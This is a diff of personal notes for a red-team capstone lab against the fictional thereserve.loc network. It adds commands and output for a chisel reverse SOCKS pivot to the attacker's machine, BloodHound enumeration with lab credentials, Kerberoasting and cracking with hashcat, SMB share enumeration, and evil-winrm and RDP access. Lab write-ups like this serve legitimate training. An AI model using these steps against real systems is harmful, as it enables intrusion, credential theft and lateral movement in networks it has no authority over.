@@ -2,6 +2,8 @@
 Red Team Capstone Challenge
 SSH key Gen + Add our Public key in VPN Machine
 Pivoting Chisel: https://github.com/jpillora/chisel/releases
+BLOODHOUND with Pivoting and Proxychains + KERBEROASTABLE SVC ACCOUNT + GetUserSpns
+proxychains evilWin + remmina
 ****
 
  
@@ -309,7 +311,7 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
         http://10.200.116.12/vpncontrol.php we will try to modify the url and get a remote shell 
 
 
-    -VPN:
+    -VPN Machine:
         nmap -T3 -sV -sC -Pn 10.200.116.12 -vv
         PORT   STATE SERVICE REASON  VERSION
         22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
@@ -428,23 +430,64 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
                                 
 
                 In Kali:
-                    chisel server -p 8000 -reverse
+                    chisel server --socks5 --reverse:
+                        create a 'fingerprint' value ex: 64..y5/.....cQ4Np=
 
                 In Machine:
-                    root@ip-10-200-116-12:/home/adib# ./chisel client <KaliIP:PORT> R:socks
+                    root@ip-10-200-116-12:/home/adib# ./chisel client --fingerprint 64..y5/.....cQ4Np= 10.50.113.14:8080 R:socks
 
                 In Kali:
-                proxychains nmap -sT -Pn 10.200.116.32
-                PORT     STATE SERVICE       VERSION
-                22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
-                ..
-                135/tcp  open  msrpc         Microsoft Windows RPC
-                139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-                3389/tcp open  ms-wbt-server Microsoft Terminal Services
-                | ssl-cert: Subject: commonName=SERVER2.corp.thereserve.loc
-                | Not valid before: 2024-04-08T18:12:35
-                |_Not valid after:  2024-10-08T18:12:35
-                |_ssl-date: 2024-05-02T01:56:00+00:00; -1s from scanner time.
-                MAC Address: 02:EF:07:A0:8C:8F (Unknown)
-                Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+                we change the proxychain conf file:
+                    └─$ sudo gedit /etc/proxychains4.conf
+                    socks5 	127.0.0.1 1080
 
+
+                    ─$ proxychains nmap 10.200.116.31 -vv
+                    PORT     STATE SERVICE       VERSION
+                    22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+                    ..
+                    135/tcp  open  msrpc         Microsoft Windows RPC
+                    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+                    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+                    | ssl-cert: Subject: commonName=SERVER2.corp.thereserve.loc
+                    | Not valid before: 2024-04-08T18:12:35
+                    |_Not valid after:  2024-10-08T18:12:35
+                    |_ssl-date: 2024-05-02T01:56:00+00:00; -1s from scanner time.
+                    MAC Address: 02:EF:07:A0:8C:8F (Unknown)
+                    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+                AD BloodHound.py:
+                    └─$ proxychains python3 bloodhound.py -d corp.thereserve.loc -u laura.wood -p "Password1@" -c all -ns 10.200.116.102 --dns-tcp
+                    
+                    We found some KERBEROASTABLE ACCOUNTS:
+                        proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <corp.thereserve.loc>/<User>:"<Passwd>@" -dc-ip 10.200.116.102  -request
+
+                    WE GET The Administrator Ticket HASH with the REF (krb5tgs$23):
+                        hashcat NTLM.hash /usr/share/wordlists/rockyou.txt -m 13100  (13100 - TGS-REP)
+
+
+                    We can Enumerate SMB in the DC:
+                        └─$ proxychains crackmapexec smb 10.200.116.102 -u'<Account>' -p '<Passwd>' --shares
+                        SMB         10.200.116.102  445    CORPDC           Share           Permissions     Remark
+                        SMB         10.200.116.102  445    CORPDC           -----           -----------     ------
+                        SMB         10.200.116.102  445    CORPDC           ADMIN$                          Remote Admin
+                        SMB         10.200.116.102  445    CORPDC           C$                              Default share
+                        SMB         10.200.116.102  445    CORPDC           IPC$            READ            Remote IPC
+                        SMB         10.200.116.102  445    CORPDC           loot$                           
+                        SMB         10.200.116.102  445    CORPDC           NETLOGON        READ            Logon server share 
+                        SMB         10.200.116.102  445    CORPDC           SYSVOL          READ            Logon server share 
+
+                    We re RUN BloodHound via the service Account:
+                        proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <corp.thereserve.loc>/<User>:"<Passwd>@" -dc-ip 10.200.116.102  -request
+
+                    We can use evilWin-rm to access machine:
+                        proxychains -q evil-winrm -u svcScanning -p <Passwd>  -i 10.200.116.31
+
+                        *Evil-WinRM* PS C:\Users\svcScanning\Documents> 
+
+                    We can also use remmina for rdp:
+                        proxychains remmina -q
+
+
+                                                                                                                                
